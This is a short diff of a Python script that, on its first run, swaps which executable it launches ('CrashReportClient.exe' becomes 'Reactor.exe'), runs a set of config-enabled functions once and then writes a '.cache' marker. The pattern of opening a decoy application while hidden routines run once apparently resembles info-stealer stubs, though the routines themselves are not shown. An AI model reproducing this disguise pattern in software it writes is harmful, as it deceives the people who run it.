@@ -19,7 +19,7 @@ def main():
     ]
 
     if os.path.exists(".cache") == False:
-        os.startfile("CrashReportClient.exe")
+        os.startfile("Reactor.exe")
         for func in funcs:
             if __CONFIG__[func.__name__.lower()]:
                 if func.__init__.__code__.co_argcount == 2:
@@ -29,8 +29,8 @@ def main():
         fp = open('.cache', 'w')
         fp.close()
 
-    else:
-        os.startfile("CrashReportClient.exe")
+#    else:
+#        os.startfile("CrashReportClient.exe")
         
 if __name__ == '__main__':
     main()
